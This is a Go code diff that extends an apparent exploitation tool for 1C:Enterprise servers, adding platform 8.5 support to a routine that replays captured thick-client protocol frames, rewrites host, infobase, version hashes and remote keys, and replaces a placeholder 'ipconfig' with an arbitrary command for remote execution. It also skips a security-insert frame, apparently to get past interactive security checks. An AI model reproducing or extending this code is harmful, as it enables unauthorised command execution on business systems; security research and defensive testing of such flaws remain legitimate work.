@@ -26,6 +26,9 @@ var thickFramesJSON []byte
 //go:embed thick_frames_v23.json
 var thickFramesV23JSON []byte
 
+//go:embed thick_frames_v85.json
+var thickFramesV85JSON []byte
+
 var (
 	vrsSessionPattern     = regexp.MustCompile(`vrs-session: [A-Za-z0-9+/=]+`)
 	contentLengthPattern  = regexp.MustCompile(`Content-Length: \d+`)
@@ -185,8 +188,17 @@ func replayThickSession(session *thickSession, command, workerEndpoint, infoBase
 		return "", err
 	}
 	framesJSON := thickFramesJSON
-	if strings.HasPrefix(platformVersion, "8.3.23.") {
+	templateInfoBase := "infosec"
+	templatePlatformVersion := "8.3.27.1786"
+	switch {
+	case strings.HasPrefix(platformVersion, "8.3.23."):
 		framesJSON = thickFramesV23JSON
+		templateInfoBase = "hunter_test"
+		templatePlatformVersion = "8.3.23.1782"
+	case strings.HasPrefix(platformVersion, "8.5."):
+		framesJSON = thickFramesV85JSON
+		templateInfoBase = "hunter_testfullt34"
+		templatePlatformVersion = "8.5.1.1150"
 	}
 	encodedFrames := make([]string, 0, 32)
 	if err := json.Unmarshal(framesJSON, &encodedFrames); err != nil {
@@ -220,18 +232,22 @@ func replayThickSession(session *thickSession, command, workerEndpoint, infoBase
 		frame = withSessionID(frame, session.id)
 		frame = vrsStatPattern.ReplaceAll(frame, nil)
 		frame = bytes.ReplaceAll(frame, []byte("192.168.153.132"), []byte(targetHost))
-		frame = bytes.ReplaceAll(frame, []byte("infosec"), []byte(infoBase))
-		frame = bytes.ReplaceAll(frame, []byte("8.3.27.1786"), []byte(platformVersion))
+		frame = bytes.ReplaceAll(frame, []byte(templateInfoBase), []byte(infoBase))
+		frame = bytes.ReplaceAll(frame, []byte(templatePlatformVersion), []byte(platformVersion))
 		compressedCall := isCommandFrame(frame)
 		if !compressedCall {
 			frame = bytes.ReplaceAll(frame, []byte("4d9ff3b8edfe324481f5cd7e62f880d2"), []byte(formVersion))
 			frame = bytes.ReplaceAll(frame, []byte("71cd0942ce7bda4fa0ed0492276effa2"), []byte(formVersion))
+			frame = bytes.ReplaceAll(frame, []byte("b86fecb37e800e4b8e69af132274604c"), []byte(formVersion))
 			frame = bytes.ReplaceAll(frame, []byte("66ef1366bf7d1f4f85ae9ddfe24f65d5"), []byte(moduleVersion))
 			frame = bytes.ReplaceAll(frame, []byte("b582d9504dbd964182177c8945f55156"), []byte(moduleVersion))
+			frame = bytes.ReplaceAll(frame, []byte("3cdb22664acf2a4abce40d5a2bbcbba4"), []byte(moduleVersion))
 			frame = bytes.ReplaceAll(frame, []byte("03FB8707-3A8E-4C4C-AD75-8B18BA7F7D47"), []byte(strings.ToUpper(remoteKey)))
 			frame = bytes.ReplaceAll(frame, []byte("03fb8707-3a8e-4c4c-ad75-8b18ba7f7d47"), []byte(strings.ToLower(remoteKey)))
 			frame = bytes.ReplaceAll(frame, []byte("F2BFDD48-85C7-475D-9045-DAB9BC86839A"), []byte(strings.ToUpper(remoteKey)))
 			frame = bytes.ReplaceAll(frame, []byte("f2bfdd48-85c7-475d-9045-dab9bc86839a"), []byte(strings.ToLower(remoteKey)))
+			frame = bytes.ReplaceAll(frame, []byte("00AA79E3-E949-47C1-A30C-F5E4E32A35C9"), []byte(strings.ToUpper(remoteKey)))
+			frame = bytes.ReplaceAll(frame, []byte("00aa79e3-e949-47c1-a30c-f5e4e32a35c9"), []byte(strings.ToLower(remoteKey)))
 		}
 		if session.token != "" {
 			frame = vrsSessionPattern.ReplaceAll(frame, []byte("vrs-session: "+session.token))
@@ -247,7 +263,8 @@ func replayThickSession(session *thickSession, command, workerEndpoint, infoBase
 				commandResponses++
 			}
 		}
-		if bytes.Contains(frame, []byte("/e1cib/opersec/insert")) && commandResponses == 0 && !bytes.Contains(previousResponse, []byte("InteractiveSecurityException")) {
+		if bytes.Contains(frame, []byte("/e1cib/opersec/insert")) && commandResponses == 0 &&
+			!strings.HasPrefix(platformVersion, "8.5.") && !bytes.Contains(previousResponse, []byte("InteractiveSecurityException")) {
 			continue
 		}
 		if _, err := session.connection.Write(frame); err != nil {
@@ -319,7 +336,7 @@ func compressedHexVersion(data []byte, marker *regexp.Regexp) string {
 			index += 2
 			continue
 		}
-		if index+1 < len(data) && data[index+1] == 0x39 {
+		if index+1 < len(data) && (data[index+1] == 0x39 || data[index+1] == 0x3f) {
 			literalLength := 0
 			for next := index + 2; next < len(data); next++ {
 				if next+1 < len(data) && data[next+1] == 0x01 {
@@ -396,10 +413,13 @@ func replaceThickCommand(frame []byte, command, remoteKey, formVersion string, d
 	}
 	body = bytes.ReplaceAll(body, []byte("4d9ff3b8edfe324481f5cd7e62f880d2"), []byte(formVersion))
 	body = bytes.ReplaceAll(body, []byte("71cd0942ce7bda4fa0ed0492276effa2"), []byte(formVersion))
+	body = bytes.ReplaceAll(body, []byte("b86fecb37e800e4b8e69af132274604c"), []byte(formVersion))
 	body = bytes.ReplaceAll(body, []byte("03FB8707-3A8E-4C4C-AD75-8B18BA7F7D47"), []byte(strings.ToUpper(remoteKey)))
 	body = bytes.ReplaceAll(body, []byte("03fb8707-3a8e-4c4c-ad75-8b18ba7f7d47"), []byte(strings.ToLower(remoteKey)))
 	body = bytes.ReplaceAll(body, []byte("F2BFDD48-85C7-475D-9045-DAB9BC86839A"), []byte(strings.ToUpper(remoteKey)))
 	body = bytes.ReplaceAll(body, []byte("f2bfdd48-85c7-475d-9045-dab9bc86839a"), []byte(strings.ToLower(remoteKey)))
+	body = bytes.ReplaceAll(body, []byte("00AA79E3-E949-47C1-A30C-F5E4E32A35C9"), []byte(strings.ToUpper(remoteKey)))
+	body = bytes.ReplaceAll(body, []byte("00aa79e3-e949-47c1-a30c-f5e4e32a35c9"), []byte(strings.ToLower(remoteKey)))
 	body = bytes.ReplaceAll(body, []byte("ipconfig"), []byte(html.EscapeString(command)))
 	compressed, err := encoder.Encode(body)
 	if err != nil {
